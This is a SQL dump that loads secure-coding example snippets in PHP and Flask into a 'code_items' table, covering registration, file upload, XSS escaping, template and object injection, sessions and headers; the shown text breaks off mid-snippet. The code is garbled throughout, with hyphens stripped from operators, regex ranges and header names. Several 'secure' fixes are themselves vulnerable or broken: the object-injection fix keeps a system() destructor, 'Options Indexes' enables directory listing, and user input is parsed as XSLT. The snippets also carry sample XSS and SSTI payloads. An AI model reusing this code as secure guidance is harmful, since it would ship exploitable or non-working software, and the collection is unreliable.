			$stmt>execute();

			if($stmt>fetch(PDO::FETCH_OBJ) == False){
				//Return true in order to complete registration
				return true;

			}else{
				//The username already exists:
				return false;
			}
		}

		public function userRegister($username, $password, $privID){

			//init DB
			$con  = new database();
			$user = new registerUser();
			$db = $con>connection();

			/*
			Whenever the user gains the ability to register himself or change his user
			credentials you must always enforce the application to compare the length of the
			submitted string against the length of the allowed string length in your database
			structure in order to prevent sql column truncation.
			*/
			$length = strlen($username);

			/*
			We now compare the length of the username against the allowed string length in
			The database structure
			*/

			if($length >= 21){
				//If length is to large the application must die.
				die("Username was to long!");
			}

			//If true than register the user!		
			if($user>Usercheck($username) === true){

				$hash = new passwordHash();

				//Than we encrypt the password with the Bcrypt encryption function of PHP
				$hash>createHash($password);

				//After successful validation we enter the new user into the database
				$stmt = $db>prepare(

				"INSERT INTO users
							(Username, Password, PrivilegeID)
						VALUES
							(?, ?, ?)");

				$stmt>execute(array($username, $hash, $privilegeID));
				$affected_rows = $stmt>rowCount();			
			}else{
				echo "Username already existed";
			}
		}
	}

    ?>
', 'User registration SQL truncation', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Character encoding


 Example:


    <?php

	/*
	This is the encoder class for whenever you have to allow certain
	possibly dangerous characters into your code for i.e names such as O''Reilly
	*/

	class encodeInput {
		//As you can see you can specify allowed characters in your function
		public function encoder($allowed, $input, $countLevel){

			//create object for logging class
			$logging = new logging();

			$return = true;

			if(!preg_match("/^[azAZ09 ".$allowed."]+$/", $input)){		

				/*
				Set a log for whenever there is unexpected user input with a threat level
				See "audit logs" code example for more information:
				*/
				$logging>setLog($_SESSION[''userID''],"Bad user inputs", "FAIL",
				date("dmy"), $_SESSION["privilege"], "HIGH");

				/*
				Set counter if counter hits 3 the users session must terminated
				After 3 session terminations the user account must be blocked
				See "audit logs" code example for more information:
				*/			
				$logging>setCounter($countLevel);
				$input = false;
			}

			//We also check for the single quote since htmlspecialchar does not encode it
			if(preg_match("/''/", $input)){
				$input = preg_replace("/''/", "&39;", $input);
			}

			//We return the input by means of htmlspecialcharacters so it becomes encoded
			return htmlspecialchars($input);
		}
	}//end class

    ?>
', 'Encoder', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Aggregate user controls


 Example:


    <?php

	/*
	In order to enforce Aggregate access control protection the best method would be to
	define your rules by means of a database structure rather than sessions or log''s.
	This is due to the fact that if the user drops his session the rating would start
	al over again.

	TABLE users
	   
	| userID | userName | password | privilegeID |    access    | AggregateControl	|
	  
	|   1    | Admin    | Csdar323 |      1      |     TRUE     |     2322         	|
	   
	|   2    | User     | Adf4fsv  |      2      |     FALSE    |     0             |
	  
	|   3    | Guest    | dff4fKr  |      3      |     TRUE     |     125           |
	

	TABLE privileges
	   
	| privilegeID | privilege        |
	
	|     1       | edit:read:delete |
	
	|     2       | edit:read        |
	
	|     3       | read             |
	
	*/

	class aggregateUserControl{
		public function countAccess($count){
			//init DB
			include("classes.php");
			$con     = new database();
			$logging = new logging();
			$db  = $con>connection();

			/*
			Each time the user accesses the database we keep track of the number of times he
			connected. Whenever the user passes a reasonable number he should be rejected
			since he could be an attacker scraping your table contents and stealing company information
			You could a CRON job in your mysql system in order to clean the Aggregate column within certain timeframes
			*/

			//First we log the access
			$logging>setLog($_SESSION[''userID''],"User access database ", "SUCCESS", date("dmy"), $privilege, "NULL");

			//After that we select
			$stmt = $db>prepare("SELECT AggregateControl FROM members WHERE userID=:id ");
			$stmt>execute(array('':id'' => $_SESSION[''userID'']));
			$row = $stmt>fetchAll(PDO::FETCH_ASSOC);

			$aggregate = 0;

			foreach($row as $rows){

				$control = $rows[''AggregateControl''];
			}

			//We add the count to control variable for the update
			$control += $count;

			if($control >= 5000){

				//First we log the surpassing of the user control count
				//setLog($_SESSION[''userID''],"Aggregate control breach", "FAIL", date("dmy"), $privilege, "HIGH");

				/*
				Then we lock out the users account assuming it has been compromised by
				an attacker.
				*/
				$access = "FAIL";
				$stmt = $db>prepare("UPDATE members SET access=? WHERE userID=?");
				$stmt>execute(array($access, $_SESSION[''userID'']));
				$affected_rows = $stmt>rowCount();

			}			

			//Then we update the users table and count +1 tot the AggregateControl column
			$stmt = $db>prepare("UPDATE members SET AggregateControl=? WHERE userID=?");
			$stmt>execute(array($control, $_SESSION[''userID'']));
			$affected_rows = $stmt>rowCount();
		}
	}

	//We use the function as follows:
	countAccess(1);

    ?>
', 'Aggregate user controls', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password storage(salting/stretching/hashing)


 Example:


    <?php

	class passwordHash{
		
		public function createHash($pwd){

			/*
			For the encryption of passwords we use PHP''s BCRYPT encryption method.
			*/

			//Here we generate a hash with a random salt
			public function HashPassword($password){
				$options = [
				''cost'' => 11,
				''salt'' => mcrypt_create_iv(22, MCRYPT_DEV_URANDOM),
				];

				$hash =	password_hash($password, PASSWORD_BCRYPT, $options)."\n";

				return $hash;
			}

			//Validate your password
			public function ValidatePassword($correctHash, $password)
			{
			if(password_verify($password, $correctHash))
				{
					//After successful validation we want to log that password was validated successfully:
					setLog($_SESSION[''userID''],"Password return true", "SUCCESS", date(ddmmyyyy), $privilege, "NULL");
					return true;
				}else{		
					//We log invalid password use
					setLog($_SESSION[''userID''],"Password return false", "FAIL", date(ddmmyyyy), $privilege, "LOW");
					return false;
				}
			}
		}
	}
			
	?>
', 'Password storage(salting stretching hashing)', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Sandboxing


 Example:


    <?php

	<iframe sandbox="value">

		/*
		sandbox=""  Applies all restrictions
		allowforms  Reenables form submission
		allowpointerlock  Reenables APIs
		allowpopups  Reenables popups
		allowsameorigin  Allows the iframe content to be treated as being from the same origin
		allowscripts  Reenables scripts
		allowtopnavigation  Allows the iframe content to navigate its toplevel browsing context
		*/

		?>
', 'Sandboxing', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Identifierbased authorization


 Example:


    <?php

	class identifierBasedAuth{ 	

		/*
		Define the whitelist pattern and validation type and input parameter like:
		identity("page1,page2,etc", "alphanumeric", $_GET[''page''], "3")
		*/
		public function identity($whiteListPattern, $validationType, $inputParameter, $countLevel){

			//Include the classes of which you want to use objects from
			include_once("classes.php");

			$validate  = new validation();
			$whitelist = new whitelisting();
			$aggregate = new aggregateControl();
			$conn  	   = new database();

			//init DB connection
			$db = $con>connection();

			$continue = true;

			/*
			First, we want to filter the filenames for expected values. For this example we use only az/09
			Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
			for more information about validation see "input validations" in the code examples:
			*/
			if($validate>inputValidation($inputParameter, $validationType,
			"Invalid user input", "HIGH", $countLevel) == false) {$continue = false;}

			/*
			Second, we want to whitelist the filenames for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			*/
			if($whitelist>checkpattern($whiteListPattern, $inputParameter, $countLevel) == false)
			{$continue = false;}

			/*
			Whenever you are checking whether a user is restricted to review certain data,
			the access restrictions should be processed server side.
			The userID could be stored inside a session variable on login, and should be used to
			retrieve user data from the database:
			*/
			if($continue == true){

				/*
				We count the number of connections towards the database,
				See "aggregate user controls" code example for more information:
				*/
				$aggregate > countConnections(1);

				$stmt = $db>prepare("SELECT * FROM table WHERE id=:userID AND page=:page");
				$stmt>execute(array('':page'' => $_GET[''page''], '':id'' => $_SESSION[''userID'']));
				$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);
			}
		}
	}

    ?>
', 'Identifier based authorization', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' PHP Object Injection


 Example:

    
	/*
	Vulnerability occur when unsanitized input is passed into the unserialize function

	<?php

		class foo{
			public $cmd;

			function __destruct()
			{
				system($cmd);
			}

		}

		$data = $_GET[''data''];

		$obj = unserialize($data);

	?>

	In the above example user can control the input to the unserialize function, which can lead to change in the $cmd variable which can even result in taking over the server.

	Do not use unserialize() function with usersupplied input, use JSON functions instead.
	We can use json_decode instead of unserialize.
	Otherwise userinput should not be able to control the unserialize function
	
	*/

	// Secure approach for preventing the PHP object injection
	
	<?php

		class foo{
			public $cmd;

			function __destruct()
			{
				system($cmd);
			}

		}

		$data = $_GET[''data''];
		$obj = json_decode($data);

	?>	
', 'PHP Object Injection', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Charsets


 Example:


    <?php

	//Add the following line of code inside the application header:
	//<meta httpequiv="ContentType" content="text/html; charset=utf8">

	//or:
	header(''ContentType: text/html; charset=utf8'');

	?>
', 'Charsets', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Content type headers


 Example:


    <?php

	//Content type header in php
	header("ContentType:text/html; charset=UTF8");

	?>
', 'Content type headers', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML injection prevention


 Example:


    <?php

	/*
	Whenever you are using XML parsers you must sanitize or encode al userinput before
	including this input into your XML file.

	Some methods like below, the Dom document already encodes the input before storing it
	into the XML. But beware, since this encoded input is still a threat whenever you are
	displaying the this data on screen as HTML output. This encoded data should be escaped
	at all times before displaying.

	Whenever your XML function does not encode your data on the fly, you may want to write
	your own function for achieving this. See the code examples and search for "Input encoding"
	for more detailed information.
	*/


	//Let us take an easy example where we store your favorite number name into a XML file.
	$doc = new DOMDocument();
	$doc>formatOutput = true;

	$r = $doc>createElement( "employees" );
	$doc>appendChild( $r );

	$b = $doc>createElement( "employee" );

	$name = $doc>createElement( "name" );
	$name>appendChild(
	$doc>createTextNode( $_POST[''name''] )
	);
	$b>appendChild( $name );

	$r>appendChild( $b );

	$doc>save("test.xml");

	/*
	We will try to insert <script>alert(123);</script> into the XML file,
	Now after inserting the employee name into the XML file it will look like:


	<?xml version="1.0"?>
	<employees>
		<employee>
		<name>&lt;script&gt;alert(123);&lt;/script&gt;</name>
		</employee>
	</employees>

	As you can see de input has been encoded but still can trigger an XSS whenever we
	extract the data as shown in the example below:

	NOTE: if you ever want to include the xml files by means of userselected sources,
	be aware of the fact that an attacker could also include sources from external websites
	and even execute External entity injections on your applications. See the "XSLT injection prevention"
	code example for more detailed information on how to implement this type of functionality since
	the same principle''s apply to both functions.
	*/


	$doc = new DOMDocument();
	$doc>load( ''test.xml'' );
	$doc > validateOnParse = true;
	$employees = $doc>getElementsByTagName( "employee" );

	foreach( $employees as $employee )
	{

		$names = $employee>getElementsByTagName( "name" );
		$name = $names>item(0)>nodeValue;

		//This example is vulnerable to XSS
		echo $name;

		//This example is escaped
		$esc = htmlspecialchars($name);

		echo $esc;

	}

	/*
	We recommend to not rely solely on the encoding of the input by the Dom document.
	So before you insert userinput into the XML file you want to have it sanitized.
	See the "Encoding" and "input validation" code examples for more detailed information
	*/

    ?>
', 'XML injection prevention', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' File upload


 Example:


	<?php

	class fileUpload{
		
		public function Image(){

			include(''classes.php'');
			$validated = new validate();
			$log = new logging();


			$image = $_FILES[''fileToUpload''];
			//File location outside of the root
			$uploaddir = ''assets/uploads/'';

			//check extensions
			$filetype = explode(".", $image[''name'']);

			/*
			For uploading out of intended directory we check the filename and verify that it only contains alphanumeric values.
			*/
			if($validated > inputValidation($filetype[0], "alphanumeric", "invalid filename", "MOD", 2){
				header(''location:/page'');
				die();
			}

			/*
			We take the last array value to make sure it is the last extension to prevent validating
			.jpg.php in a file name.
			*/
			$takeLastValue = count($filetype)  1;

			while(($filetype[$takeLastValue] != "png") && ($filetype[$takeLastValue] != "jpg")){

				//Set a log for whenever there is an unexpected user input with a threat level
				$log > setLog($_SESSION[''userID''],"Unrestricted image extension upload",
				"FAIL", date(ddmmyyyy), $privilege, "HIGH");

				/*
				Set counter; if counter hits 3, the user''s session must be terminated.
				After 3 session terminations the user account should be blocked
				Since the high threat level will lead to immediate session termination
				*/
				$log > setCounter(3);

				//The die function is to make sure the rest of the php code is not executed beyond this point
				die();
			}

			 // Check file size
			if($image["size"] > 500000) {
				 header(''location:/page'');
				 die();
			 }

			// Check if file already exists to prevent overwriting
			if(file_exists(''assets/uploads/''.$image[''name''])) {
				header(''location:/page'');
				die();
			}  

			//if all goes well upload your file, first we want to log the event.
			$log > setLog($_SESSION[''userID''],"File upload", "SUCCESS", date(ddmmyyyy),
			$privilege, "NULL");

			$uploadfile = $uploaddir . basename($image[''name'']);
			move_uploaded_file($image[''tmp_name''], $uploadfile);

			//Last mime type check after upload if not correct than delete!
			$finfo = finfo_open(FILEINFO_MIME_TYPE);
			echo $theType = finfo_file($finfo, $uploaddir.$image[''name'']);

			if($theType != "image/jpeg" && $theType != "image/png"){    
				unlink($uploaddir.$image[''name'']);

				//Set a log for whenever there is unexpected user input with a threat level
				$log > setLog($_SESSION[''userID''],"invalid image mime type",
				"FAIL", date(ddmmyyyy), $privilege, "HIGH");

				/* ^^
				Set counter; if counter hits 3, the user''s session must be terminated.
				After 3 session terminations the user account should be blocked
				since the high threat level can lead to immediate session termination.
				*/
				$log > setCounter(3);

				//The die function is to make sure the rest of the php code is not executed beyond this point
				die();              
			}
		}
	}
	?>
', 'File upload', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Privilege based authentication


 Example:


    <?php

	/*
	For privilege based authentication we need an extra table in your database in order to write the users privileges to.

	TABLE users
	    
	| userID | userName | password | privilegeID |    access	| AggregateControl	|
	   
	|   1    | Admin    | Csdar323 |	  1      | 	   TRUE		|		2336        |
	   	
	|	2    | User	    | Adf4fsv  |	  2      |	   FALSE	|		 0         	|
	   
	|	3    | Guest    | dff4fKr  |	  3	     |	   TRUE		|		135	       	|
	   

	TABLE privileges
	   
	| privilegeID | privilege        |
	
	|     1	      | edit:read:delete |
	
	|	  2	      | edit:read        |
	
	|	  3	      | read             |
	

	Now instead of using roles in sessions we rather want to assign privileges to users
	by means of a DatabaseBased Authentication system.
	Now we can easily assign a user certain privileges for him to access.
	*/

	class privilege{

	//Here is the isAuthorized function in which we check whether the user is permitted to do the action
	public function isAuthorized($ispermitted){

		//we make object of logging class for our logging methods also for db connection
		include("classes.php");

		$logging = new logging();
		$con 	 = new database();

		$db = $con>connection();

		//We select the privilege from the database
		$stmt = $db>prepare("
			SELECT a.username, a.password, a.privilegeID, b.privilegeID, b.privilege   
				FROM users as a
					JOIN privileges as b
						ON a.projectID = b.projectID
							WHERE a.userID = :id and b.access=''TRUE''");

		$stmt>execute(array('':id'' => $_SESSION[''userID'']));
		$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

		foreach($rows as value){
			$privilege = $value[''privilege''];
		}

		//We first explode the value''s to see how much parts the arrays consists of
		$permission    = explode(":", $privilege);
		$authorization = explode(":", $ispermitted); // $ispermitted

		//Then we count the authorization array
		$count     = count($authorization);
		$counthits = 0;

		/*
		We check the permissions against the ispermitted value to see how many times
		they match. whenever they match we count the hits
		*/
		foreach($permission as $value){
			if(preg_match(''/''.$value.''/'', $ispermitted)){
				$counthits++;
			}
		}

		/*
		Whenever the counts hits are greater or equal to the needed permissions
		we now know we deserved access to the part of the system.
		*/
		if($counthits >= $count){

			//Log that the user had sufficient privileges:
			$logging>setLog($_SESSION[''userID''],"User was privileged!", "SUCCESS",
			date("dmy"), $privilege, "NULL");

			return true;
		}else{

			//Log that the user had insufficient privileges:
			$logging>setLog($_SESSION[''userID''],"User was not privileged!", "FAIL",
			date(ddmmyyyy), $privilege, "HIGH");

			/*
			Set counter; if counter hits 3, the user''s session must be terminated.
			After 3 session terminations the user''s account must be blocked.
			Given the high threat level, there will be immediate session termination.
			in this case the user tried to manipulate the application operation in order to do things he is not
			privileged to, immediate session termination will follow!
			*/

			$logging>setCounter(3);

			return false;
			}
		}
	}

	/*
	This is how you enforce the permissions in your application
	We define the roles we want the user to suffice
	*/

	if(isAuthorized("edit:read:delete") === true){
		//Do your operation
	}

	/*
	if ever there are new ''roles'' added to the system you can easily assign them the needed privileges without
	having to add new roles throughout your entire system. This system takes a little more planning up ahead but
	it enforces higher level of security.
	*/

    ?>
', 'Privilege based authentication', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HTML output


 Example:


    <?php

	/*
	Whenever user input is displayed in the application, whether, as content or a parameter value
	submitted towards the url, all user input should be properly escaped to prevent XSS injections.
	*/

	//For normal output this escaping will do the trick
	$escaped = htmlspecialchars($_POST[''value''], ENT_QUOTES, ''UTF8'');
	echo $escaped;

	//This also applies, for instance, when retrieving content from a database:
	while($row = $stmt>fetch(PDO::FETCH_ASSOC)) {
		echo htmlspecialchars($row[''value''], ENT_QUOTES, ''UTF8'');
	}

	/*
	Security consists of different layers of protection, in order to guarantee the integrity
	of your application. This means that the value submitted from the user should
	already be sanitized before being submitted towards the database in order to prevent XSS.
	As an example, you are expecting only alphanumerical value here:
	*/

	if(!preg_match("/^[azAZ09]+$/", $escaped)){
		die();
	}

	/*
	This type of approach should be used whenever you are allowing user input in
	your DOM like for example, let''s say a user was allowed to upload an image and
	set an alt text. when you do not sanitize his input a possible attack string could be:
	*/

	this is an image" onload="alert(''XSS'');"

	/*
	whenever this string now is added to the users image this will be the outcome, leading
	to xss:
	*/

	<img src="http://image.com/image.jpg" alt="this is an image" onload="alert(''XSS'')"" />

	/*
	After this sanitation malicious code can no longer exist in the $_POST[''value''] variable.

	Another possibility for attackers to execute an XSS injection, is to pass malicious code directly
	into the URL by means of a "href", e.g.:
	javascript:alert(document.cookie);
	or
	data:text/html;base64,base64xssinjection

	In the following scenario escaping with htmlspecialchars() is not sufficient to block the injection.
	By checking the URL to see if it starts with either http:// or https:// whenever a link has
	been submitted to the web application by a user.

	?>
', 'HTML output', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XXSSProtection header


 Example:


    """
    In order to set the XXSSProtection header, you''ll have to add the following code to the head of your application
    """

    @app.after_request
    def anti_XSS(response):
        response.headers["XXSSProtection"] = "1; mode=block"
        return response
', 'X XSS Protection header', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Server Side Template Injection prevention


 Example:

    
	"""
	Server Side Template Injection, a frequent critical vulnerability that has high chance of 
	mistaken as Cross Site Scripting and miss it entirely. But inline XSS, it can lead attack in 
	Web server and may even obtain a RCE. Template Injection occurs when user input is embedded in a template in an unsafe manner. 
	"""

	//Vulnerable piece of Code which can lead to SSTI
	@app.errorhandler(404)
	def page_not_found(e):
    	template = ''''''{%% extends "layout.html" %%}
		{%% block body %%}
    	<div class="centercontent error">
        <h1>Oops! That page doesn''t exist.</h1>
    	<h3>%s</h3>
    	</div>
		{%% endblock %%}
		'''''' % (request.url)
    	return render_template_string(template), 404

    """
    The above code is vulnerable to SSTI,
    If we give http://www.example.com/ss/<script>alert(1)</script>
    This will show an alert box, which means its vulnerable to XSS
    If we give http://www.example.com/ss/{{3*3}}
    This will show an output 9, which further tells us that it is vulnerable to code injection or SSTI
    """

    //Sanitization of user input can fix the issue
    @app.errorhandler(404)
	def page_not_found(e):

		//Initialize
		continue = True

		//Escape function would fix the issue
    	url = request.url
    	url = escape(url)
    	
    	//Checking the url
    	p = re.compile(r''(http://www.example.com/(.*))(\?.*)?'')

    	if inputValidation(url, "alphanumeric") or len(url>20) or inputValidation(url, "alpha"):
    		continue = False
    	
    	if p.match(url) and continue==True:

    		template = ''''''{%% extends "layout.html" %%}
			{%% block body %%}
    		<div class="centercontent error">
        	<h1>Oops! That page doesn''t exist.</h1>
    		<h3>%s</h3>
    		</div>
			{%% endblock %%}
			'''''' % (url)
    		
    		return render_template_string(template), 404

', 'Server side template Injection prevention', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce secure passwords


 Example:


    def checkPassword(pwd):
    	error = []
    	proceed = True
    	//Recommended a longer password for Security
    	if(len(pwd) < 13):
        	error.append("Password is too Short!!")
        	proceed = False
    
    //The password should include at least one number, a small letter, a CAPS,
    //Plus a special character as defined in the patterns array:
    
    	if not any(x.isupper() for x in pwd):
        	error.append(''Your password needs at least 1 capital letter'')
    	if not any(x.islower() for x in pwd):
        	error.append(''Your password needs at least 1 small letter'')
    	if not any(x.isdigit() for x in pwd):
        	error.append(''Your password needs at least 1 digit'')

    
    //Even though your password is sufficient according to all your standards, the password could still be weak.
    //Just imagine the password "Password!"; this could easily be guessed by an attacker. To prevent the use of weak passwords we 
    //compare the password with a list of top 500 bad passwords and if matched, the password wil be rejected:

    	file = open(''badpasswords.txt'').read()
    	pattern = file.split(",") 

    	for value in pattern:
        	if value != pwd:
            	pass
        	else:
            	error.append("Your password was matched with the bad password list, please try again.")
            	proceed = False
            	break

    	if proceed == True:
        	flash("Your password is allowed!")
        	return True
        else:
        	flash("Password validation failure(your choice is weak):")
        	for x in error:
            	print x
        	return False', 'Enforce secure passwords', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reauthentication


 Example:
    

    """
    Whenever a user wants to change his credentials or do other important data exchanges such as
    transferring money he should always be challenged to reauthenticate himself before
    allowing them to perform these actions.
    """
    
    def reauthenticate(password):
        user = User.query.filter_by(id=session[''id'']).first()

        //Validation of password in bcrypt encryption
        if ValidatePassword(user.password, password):
        
            //After successful validation we will log that password was validated successfully
            setLog(session[''id''], "Password return true", "SUCCESS", str(datetime.utcnow()), session[''privilege''], "NULL")

            //Here we set a session to see if the user is authenticated throughout the system
            session[''access''] = ''active''

            """
            The userID in a session variable to use as an identifier to prevent a user reading
            into unauthorized data, See Identifierbased authorization for more information and
            code examples.
            """

            //Setting the user Id
            session[''id''] = user.id

            return True

        else:

            //The user failed reauthenticating himself
            setLog(session[''id''], "Reauthentication failed", "FAIL", str(datetime.utcnow()), "null", "MOD")
            //If authentication failed destroyed the session
            session.destroy()
            session.regenerate()
            session[''access''] = ""

            return False


    """
    Before we let a user perform certain actions he should first be challenged to authenticate
    himself. imagine the following scenario, the user wants to change his email address.
    """

    if reauthenticate(password) !== True :

        return "<div id=''error''>please reauthenticate yourself<div>"\
    	+ "<form method=''post''>"\
    	+ "<input type=''password'' name=''password''/>"\
    	+ "<input type=''submit'' name=''authenticate''/>"\
    	+ "</form>"

    else:
    	//Do operation for changing the email address
    	return "<div id=''success''>You can now change your email address!</div>";

', 'Re authentication', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XSL injection prevention


 Example:

    
    """
	In order to prevent XSL injections you must enforce strict policy''s whenever the
	files are loaded from a source controlled by an possible attacker.

	Let''s say for example that the user can choose from several XSL files on your application.

	ABC.xsl arranges your employee names on alphabetical order
	CBA.xsl does not care and just shows the input by order of your XML file.

	Before we want to attach the XSL files to the style sheet we first want to
	do validation on the request to make sure the included file was one of our own pre
	defined files, example:
	including("file1.xsl,file2.xsl,etc", filename)
	"""


	def including(whiteListing, input):

		continue = True

		"""
		First, we want to filter the filenames for expected values. For this example we use only az/09 and .
		Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
		for more information about validation see "input validations" in the code examples:
		"""

		if inputValidation(inputParameter, validationType, "Invalid userinput", "HIGH") == False:
			continue = False

		"""
		We want to whitelist the paged for expected values, in this example they are,
		page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
		"""

		if whitelisting(whiteListing, input, count) == False:
			continue = False

		//If all went good we do the function
		if continue == True:
			//Load XML file
			root = etree.parse("test.xml")

			xslt_root = etree.XML(input)
			transform = etree.XSLT(xslt_root)

			//Transform the XML
			result_tree = transform(root)

		else: 

			return False', 'XSL injection prevention', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies (domain)


 Example:


	"""
	Whenever a session is started, and you want to share it over different domains,
	the domain value should be set to the specific domain
	"""

	from flask import Flask, session

	//Initialize the flask application
	app = Flask(__name__)

	//Set the secret key.  keep this really secret:
	app.secret_key = open("/dev/random","rb").read(32) 

	//Name of the session cookie
	app.config[''SESSION_COOKIE_NAME''] = ''hrj''
	//Path for the session cookie
	app.config[''SESSION_COOKIE_PATH''] = ''/''
	//Domain for the session cookie
	//Configure domains, do not use .yourdomain.com (wildcard)
	//This increases the attack surface!
	app.config[''SESSION_COOKIE_DOMAIN''] = ''demo.yourdomain.com''
	//Controls if the cookie should be set with the secure flag
	app.config[''SESSION_COOKIE_SECURE''] = True
	//Controls if the cookie should be set with the httponly flag
	app.config[''SESSION_COOKIE_HTTPONLY''] = True
	//Lifetime of a permanent session
	app.config[''PERMANENT_SESSION_LIFETIME''] = 3600

	//Store Value in session
	session[''type''] = "value"', 'Session cookies (domain)', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory listing


 Example:


    """
    To disable or prevent directory access, add following line in your .htaccess file. If
    user points the browsers to a directory that does not have an index file, then a
    "403 Forbidden" error will be displayed:
    Add this line of code to your .htaccess file:
    """

    Options Indexes

	//Python code to display the files from the uploads folder

	@app.route(''/uploads/<filename>'')
	def uploaded_file(filename):
    	try:
        	return send_from_directory(app.config[''UPLOAD_FOLDER''], filename)
    	except Exception as e:
        	return redirect(url_for(''upload'')) 

', 'Directory listing', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reflective file download and file download injection prevention


 Example:

    
	def downloadUserFiles(fileId):
		
		proceed = True

		"""
		For the sake of example we only allow the users to download their own files
		by identifier based sql query''s. As you can see we select the filename
		by its id. in this case we prevent direct user input into the disposition header.
		"""

		if inputValidation(fileId, "numeric", "validate was false", "HIGH", 3) == False:
			proceed = False

		if proceed = True:
			file = Download.query.filter_by(fileId=fileId, userId=session[''id'']).first()

			filename = file.fileName
			mimeType = file.mimeType

			if filename:

				"""
				We also define the mimetype per download file.
				This is because whenever a user can only download images it is not necessary to set
				an uncommon contenttype header for it.
				NOTE: These mimetypes should not be stored based upon the mimetype which was send
				the response header when the user uploaded the file. This value can be easily
				manipulated with an intercepting proxy. You should get the mimetype from the file
				itself after it was stored on the server.
				"""

				response = Response(open(app.config[''UPLOAD_FOLDER''] + filename).read())
				response.headers["ContentDescription"] = "File Transfer"
				response.headers["Contenttype"] = mimeType
				response.headers["ContentDisposition"] = "attachment; filename=" + filename
				response.headers["Expires"] = 0
				response.headers["CacheControl"] = "nostore, nocache, mustrevalidate, maxage=0"
				response.headers["CacheControl"] = "postcheck=0, precheck=0", false

				if os.path.exists(app.config[''UPLOAD_FOLDER''] + filename):
        			return response

	"""
	The second example is for whenever you are providing users with fixed downloads
	such as manuals etc. We do not only check if the file just exists, because that would
	allow an attacker to also download important other files from your server, so instead
	we whitelist them.
	"""
	
	def downloadStored(filename):

		response = Response(open(app.config[''UPLOAD_FOLDER''] + filename).read())

		if whitelisting("file1.txt,file2.txt", $filename) != False:
			response.headers["ContentDescription"] = "File Transfer"
			response.headers["Contenttype"] = ''text/plain''
			response.headers["ContentDisposition"] = "attachment; filename=" + filename
			response.headers["Expires"] = 0
			response.headers["CacheControl"] = "nostore, nocache, mustrevalidate, maxage=0"
			response.headers["CacheControl"] = "postcheck=0, precheck=0", false
			response.headers["ContentLength"] = os.path.getsize(filename)

			if os.path.exists(app.config[''UPLOAD_FOLDER''] + filename):
        			return response
			', 'RFD and file download injection prevention', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XContentTypeOptions header


 Example:


    """
    In order to set the "XContentTypeOptions" header you''ll have to add the following code to the head of your application
    """

    @app.after_request
    def anti_ContentType(response):
        response.headers["XContentTypeOptions"] = "nosniff"
        return response
', 'X Content Type Options header', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Audit logs


 Example:


    """
    The log function does not have to be complicated as long as you log at least these 6 values

    Whenever a user is registered or added to your system, the application must also
    automatically generate a table for this user which contains his userID, counter and blocker
    variable in order to keep track of his behavior.
    """

        def setLog(userId, error, value, date, threat):

            """
            There are different threats : LOW, MEDIUM, HIGH

            NULL if the operation is success

            LOW threats are debugging logs or information logs when it goes wrong

            MEDIUM threats can be failure of validation check, whitelisting checks failure

            HIGH threats can even result in ban of users, security testing and maximum number of tries
            """
            
            //Take the client''s IP address
            ip = request.remote_addr

            //Save log file in a directory which has restrictions in place so no one can 
            file = "restrictedfolder/logfile.txt"
            f = open(file, ''w+'')
            
            //Notice how we user the userID instead of the actual username in order to prevent the integrity of these usernames
            f.write(date + str(userId) + error + value + threat + "Ip : " + str(ip))
            f.close()


        class Counter(db.Model):
            __tablename__ = "counter"
            count = db.Column(db.Integer, nullable=False)
            blocker = db.Column(db.Integer, nullable=False)
            userID = db.Column(''userID'', db.Integer, db.ForeignKey(''users.user_id''), primary_key=True)

            def __init__(self, count, blocker, userID):
                self.count = count 
                self.blocker = blocker
                self.userID = userID

            def increment(self, count):
                self.count+= count
                self.blocker+= count

                if self.counter >= 3:
                    setLog(self.userId,"The users session was terminated", "SUCCESS", datetime.utcnow(), "NULL")
                    //After the counter has terminated a session he should be set to zero again
                    self.count = 0
                    //Log that the users sessions have been terminated
                    logout()

                if self.blocker >= 12:
                    //If the blocker was bigger than 12 it means the user has made three strikes and his account should blocked
                    setLog(self.userId,"The users is denied access to system", "SUCCESS", datetime.utcnow(), "NULL")
                    user = User.query.filter_by(id=self.userID).first()
                    user.status = ''Blocked''', 'Audit logs', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' CSRF tokens


 Example:


    //The random CSRF token generated need to be send to the server with every form submission. 
    //We are using FlaskWTF, for installing that: 
    //pip install U FlaskWTF
    //In HTML Forms, for specifying the CSRF we can use the below code

    <form method="post">
      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
    </form>

	//For ajax requests, we can use the below code

    <script type="text/javascript">
    var csrf_token = "{{ csrf_token() }}";

    $.ajaxSetup({
